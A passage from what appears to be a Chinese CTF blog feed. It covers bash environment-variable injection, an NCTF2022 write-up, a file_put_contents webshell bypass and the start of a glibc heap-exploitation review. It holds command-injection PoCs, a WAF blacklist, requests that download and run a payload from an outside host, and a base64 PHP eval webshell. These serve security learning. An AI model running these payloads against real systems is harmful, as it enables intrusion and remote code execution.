class="token operator">+</span><span class="token number">0200</span><span class="token operator">++</span><span class="token operator">+</span> variables<span class="token punctuation">.</span>c <span class="token number">2014</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">25</span> <span class="token number">13</span><span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">29.869420719</span> <span class="token operator">+</span><span class="token number">0200</span>@@ <span class="token operator">-</span><span class="token number">268</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token operator">+</span><span class="token number">268</span><span class="token punctuation">,</span><span class="token number">7</span> @@ <span class="token keyword">static</span> <span class="token keyword">void</span> propagate_temp_var <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PTR_T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">void</span> dispose_temporary_env <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">sh_free_func_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">-</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">char</span> <span class="token operator">*</span>mk_env_string <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">char</span> <span class="token operator">*</span>mk_env_string <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_env_array_from_var_list <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SHELL_VAR <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_var_export_array <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span>VAR_CONTEXT <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>make_func_export_array <span class="token function">__P</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@@ <span class="token operator">-</span><span class="token number">301</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token operator">+</span><span class="token number">301</span><span class="token punctuation">,</span><span class="token number">14</span> @@ <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span> <span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token comment">/* Prefix and suffix for environment variable names which contain+   shell functions. */</span><span class="token operator">+</span>#define FUNCDEF_PREFIX <span class="token string">"BASH_FUNC_"</span><span class="token operator">+</span>#define <span class="token function">FUNCDEF_PREFIX_LEN</span> <span class="token punctuation">(</span><span class="token function">strlen</span> <span class="token punctuation">(</span>FUNCDEF_PREFIX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>#define FUNCDEF_SUFFIX <span class="token string">"()"</span><span class="token operator">+</span>#define <span class="token function">FUNCDEF_SUFFIX_LEN</span> <span class="token punctuation">(</span><span class="token function">strlen</span> <span class="token punctuation">(</span>FUNCDEF_SUFFIX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可见，在这个补丁里也引入了<code>FUNCDEF_PREFIX</code>和<code>FUNCDEF_SUFFIX</code>，只不过和4.4以下的有一处差异：<strong>Bash 4.4下<code>FUNCDEF_SUFFIX</code>等于<code>%%</code>，而这个4.2的补丁中<code>FUNCDEF_SUFFIX</code>等于<code>()</code></strong>。</p><p>所以在更低版本的bash中，失败的原因是变量名的错误，下面改变poc即可成功。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">env</span> <span class="token string">$'BASH_FUNC_echo()=() &#123; id; &#125;'</span> <span class="token function">bash</span> -c <span class="token string">"echo hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>所以，之后我们遇到环境变量注入，可以进行下列三种测试：</p><ul><li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如<code>TEST=() &#123; :; &#125;; id;</code></li><li>Bash 4.4以前：<code>env $'BASH_FUNC_echo()=() &#123; id; &#125;' bash -c &quot;echo hello&quot;</code></li><li>Bash 4.4及以上：<code>env $'BASH_FUNC_echo%%=() &#123; id; &#125;' bash -c 'echo hello'</code></li></ul><p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p><h1>0x03 总结</h1><p>本文完整地讲述了我是如何研究环境变量注入导致的安全问题。</p><p>经过阅读dash和bash的代码，我发现了这样一些可以导致命令注入的环境变量：</p><ul><li><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</li><li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li><li><code>PS1</code>：可以在<code>sh</code>或<code>bash</code>交互式环境下执行任意命令</li><li><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</li><li><code>BASH_FUNC_xxx%%</code>：可以在<code>bash -c</code>或<code>sh -c</code>的时候执行任意命令</li></ul><p>利用最后一个trick，功在CentOS下解决了本文开头提出的问题。<br>同时在不同版本的centos下也有了不容的poc。</p><h1>0x04 拓展</h1><p>从分析问题的角度来看，在php中考虑开头的问题，总共分析了以下几点：</p><ul><li>分析源码转化问题</li><li>分析 bash dash 和 system执行的命令<br>所以，当我们遇到环境变量可控的时候，除了尝试以上已经发现的poc之外，还可以尝试一下分析system执行的命令，有没有新的环境变量利用途径。</li></ul><p>同时考虑到分析的第一点，转化为问题，php中的system最终调用的是<code>sh -c</code> 那么在其他的语言中，是否也有类似问题？</p><p>如果调用的是 sh 的话，是不是能进一步扩大get shell的范围？</p><h2 id="例题-NCTF2022-calc-calc-revenge"><a class="header-anchor" href="#例题-NCTF2022-calc-calc-revenge">¶</a>例题 NCTF2022 calc/calc_revenge</h2><p>关键代码如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    num <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>    log <span class="token operator">=</span> <span class="token string">"echo &#123;0&#125; &#123;1&#125;> ./tmp/log.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d-%H%M%S"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>log<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"waf!!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>就注意一个eval执行不报错的情况下，把命令传入system执行，且能够把回显带出来，这反而让绕waf变成了主要目的了，这也导致了很多非预期的出现，先看一下非预期是怎么解决的。</p><p>因为开了debug模式，导致可以在错误界面看到waf的规则。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>发现<code>%0a</code>可以换行，分割不同命令，使用<code>%09</code>可以代替空格，然后使用单引号把命令包起来，又因为是出网环境，所以可以直接curl 下载payload配合msf上线。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/calc?num<span class="token operator">=</span>%0a<span class="token string">'curl'</span>%09<span class="token string">'http://x.x.x.x:yyyy/testapp'</span>%09<span class="token string">'-o'</span>%09<span class="token string">'/tmp/testapp'</span>%0a/calc?num<span class="token operator">=</span>%0a<span class="token string">'chmod'</span>%09<span class="token string">'777'</span>%09<span class="token string">'/tmp/testapp'</span>%0a/calc?num<span class="token operator">=</span>%0a<span class="token string">'/tmp/testapp'</span>%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>执行了一个testapp的shellcode。</p><h2 id="预期"><a class="header-anchor" href="#预期">¶</a>预期</h2><p>但是如果这题没有开启debug模式，虽然还是可以用上面的方式做，但是猜到waf还是需要一点时间的，回去看预期解，在python中system函数，最终的调用也是<code>sh -c</code>，所以可以考虑使用p神的poc进行攻击，那么问题就来到了如何使用eval控制环境变量？</p><p><a href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">python黑魔法-绕过空格实现变量覆盖</a><br>通过eval函数实现变量覆盖，在python中是可以实现的，实际上这并不是eval函数的特性，而是python的特性。</p><ol><li><code>&gt;&gt;&gt; a = 0</code></li><li><code>&gt;&gt;&gt; for a in [1]:</code></li><li><code>… pass</code></li><li><code>…</code></li><li><code>&gt;&gt;&gt; a</code></li><li><code>1</code></li><li><code>&gt;&gt;&gt;</code><br>利用list，可以达成一些变量的重新赋值，在不使用空格的情况下，用python的list生成器语法，也可以达到目的。</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这行代码的意思是遍历 [1] 这个 list ，赋值给 a，然后再返回一个 str，因为没有执行的原因，所以返回的是一个函数：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>这样看起来可能有点抽象，下面再给几个例子。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>这是没有绕过空格的情况，因为list生成器，导致每执行一次for循环都会调用一次str函数，而str函数返回是空，所以最后就没有生成字符，返回一个空字符串列表。<br>而利用上面的赋值，再对a进行修改：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'test'</span><span class="token punctuation">:</span><span class="token string">'asd'</span><span class="token punctuation">&#125;</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">&#123;</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>利用for循环对a修改且不会报错，最终要的是，命令只有一行，可以eval直接执行，所以可以利用这个对环境变量注入。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>  File <span class="token string">"D:\softwares\Conda\lib\os.py"</span><span class="token punctuation">,</span> line <span class="token number">675</span><span class="token punctuation">,</span> <span class="token keyword">in</span> __getitem__    <span class="token keyword">raise</span> KeyError<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token boolean">None</span>KeyError<span class="token punctuation">:</span> <span class="token string">'abc'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">in</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token string">'1'</span><span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>成功注入环境变量，然后按照p神的方式，利用这个注入和system拿到shell即可。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境变量注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>file_puts_contents利用</title>
    <link href="/2022/12/09/file-puts-contents%E5%88%A9%E7%94%A8/"/>
    <url>/2022/12/09/file-puts-contents%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>最近一次比赛，遇到了两个web题，都是关于<code>file_puts_content</code>利用的反序列化，挺有意思的，记录一下，核心代码如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">$d   = '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"886"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>';$a= $d. $this->text;file_put_contents($this-> file,$a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>按照思路，利用写函数直接写一个shell就可以了，但是题目做了一点改变，把我们的数据添加在了<code>&lt;?php die(&quot;886&quot;);?&gt;</code>后面，所以在简单的写shell上面，需要做一点改变。</p><p>利用php的伪协议可以施展一点魔法做到这点。</p><h1>method base64</h1><p>使用<code>php://filter</code>的base64-decode方法，将输入的<code>text</code> base64加密传入，因为该伪协议接受一个base64字符串，然后将字符串解码后写入，所以明文的die等代码会被解密为乱码，而我们输入的base64-shell会被解码为正常的代码，从而绕过了题目的<code>&lt;?php die(&quot;886&quot;)?&gt;</code></p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>PD9waHAgZXZhbChAJF9QT1NUWydjbWQnXSk7Pz4=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>直接传参，发现生成的shell.php是一个空文件，也就意味着，写入失败了。<br><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/20221209205217.png" alt=""></p><p>下面又引出了另外一个问题，base解码的时候，是8位一起解码的，所以说，输入的字符串需要能够被正常解码才可以，而看源代码:</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"886"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这里的<code>&lt; ? &gt; ()&quot; ;</code>都不在码表之内，所以不会翻译，去掉这些字符就只剩下<code>phpdie886</code>一共九个字符，是不会被正常解码的，所以我们还需要输入7个垃圾字符，填满16个字符，这样后面的shell才会被正确翻译。<br><img src="https://fortypra.oss-cn-hangzhou.aliyuncs.com/img/20221209205613.png" alt=""></p><p>这里我就只记录这一点了，其他的方式大同小异，各有各的绕过方法，具体链接如下： <a href="https://www.cnblogs.com/yokan/p/12650702.html">https://www.cnblogs.com/yokan/p/12650702.html</a><br>因为没注意base64的问题，所以打了很久都没通过，后来注意到了这个问题，也算是在web道路上越走越远了(smile)。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆利用回顾</title>
    <link href="/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%E5%9B%9E%E9%A1%BE/"/>
    <url>/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%E5%9B%9E%E9%A1%BE/</url>
    
    <content type="html"><![CDATA[<p>😄堆上的知识好像都不记得了，专门做总结回顾一下，以后再回来看就没必要重新开始学习。</p><h1>basic</h1><p><strong>几种bins的进入退出方式</strong></p><ul><li><p>fastbin： FILO，从头部插入和取出</p></li><li><p>unsorted bin： FIFO，从头部插入，从尾部取出</p></li><li><p>tcache： LIFO，从头部插入，头部取出</p></li></ul><p><strong>mmap</strong>函数分配的映射空间和malloc分配的空间不一样，有一个要注意的地方是，mmap出来的地址和<strong>libc基址</strong>存在固定的偏移，在leak的时候可以考虑。</p><h2 id="fastbin的一些机制"><a class="header-anchor" href="#fastbin的一些机制">¶</a>fastbin的一些机制</h2><p>首先，fastbin一般情况下不会发生合并，除非触发<code>malloc_consolidate()</code>，当一个堆块加进<code>fast bin</code>的时候，不会检查下一个chunk的<code>prev_inuse</code>，这也意味着，fastbin大小的chunk被使用和释放都不会触发和下一个chunk有关的安全机制。</p><p>但是fastbin在释放的时候会检查自己的size大小，然后放入到合适的fastbin链中，同样的，从fastbin中取出时，也会检查size的大小是否和当前链相符合，这要求后续伪造fastbin chunk的时候注意<code>size</code></p><p><strong>malloc_consolidate</strong>： 当申请一个大于<code>large chunk</code>最小大小之后（包括当申请的<code>chunk</code>需要调用<code>brk()</code>申请新的<code>top chunk</code>或调用<code>mmap()</code>函数时），<strong>触发malloc_consolidate</strong>，程序会将<code>fastbin</code>内的chunk取出，相邻的f<code>ree chunk</code>合并后放入<code>unsorted bin</code>，此时完成了该完成的所有合并之后，寻找之前malloc的large chunk，理论上small bin无法满足需求，于是会遍历<code>unsorted bin</code>，此时<code>unsorted bin</code>将之前合并的<code>chunk</code>完成再分配。</p><p>可以预见到最后的效果是<code>fast bin</code>中的chunk被填入了<code>small bin</code>，或者合并到了unsorted bin，被吞入了<code>top chunk</code>。</p><h2 id="unsorted-bin"><a class="header-anchor" href="#unsorted-bin">¶</a>unsorted bin</h2><p>unsorted bin一般是<code>leak</code>的主要地点，和fast bin不同的是，unsorted bin是一个双向链表，由<code>fd</code>和<code>bk</code>链接，主要还是由<code>bk</code>遍历（源码决定）<code>A&lt;-B&lt;-C</code>进一个<code>D</code>变为<code>D&lt;-A&lt;-B&lt;-C</code>，拿出一个<code>C</code>，变为<code>D&lt;-A&lt;-B</code>。<code>bin</code>中堆块大小可以不同，不排序。</p><p><strong>泄露libc</strong>，这是因为<code>unsorted bin</code>中最先进来的chunk，其中<code>fd</code>和<code>bk</code>都指向<code>bin</code>，而这个<code>bin</code>，存在于<code>main_arena</code>的结构体中，在64位低版本的libc中，一般是<code>&lt;main_arena+88&gt;</code>，版本稍微高一点就在<code>&lt;main_arena+96&gt;</code>，一般泄露libc都会利用这个地址。</p><p>同时main_arena的地址和malloc_hook很近，即<code>malloc_hook+0x10=main_arena</code></p><h2 id="large-bin"><a class="header-anchor" href="#large-bin">¶</a>large bin</h2><p>这是一个重点，在现在高版本的libc中，几乎都是用large bin attack加上其他的手法攻击，large bin是双链表维护，但是维护的方式有点特别，不再是单一的链表管理，而是分块管理。large bin 以前学习的也不多，下面做一个详细的基础介绍</p><p>基本的理解可以理解为横向和纵向链接，从空间上来类比基本上是一个网状结构，但是又不完全是网状，<strong>一条绳子上一个区域内大小的chunk通过fd_nextsize和bk_nextsize连接在一起，相同大小的chunk又通过fd和bk相链接</strong></p><p>在观察如何取出和存入chunk的时候不妨看一段源码</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_largebin_range</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//判断是否属于largebin  </span>            <span class="token punctuation">&#123;</span>                victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//寻找当前size在largebin中的  </span>              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//寻找main_arena  </span>              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span><span class="token comment">//size最大的chunk的地址  </span>                 <span class="token comment">/* maintain large bins in sorted order */</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span> <span 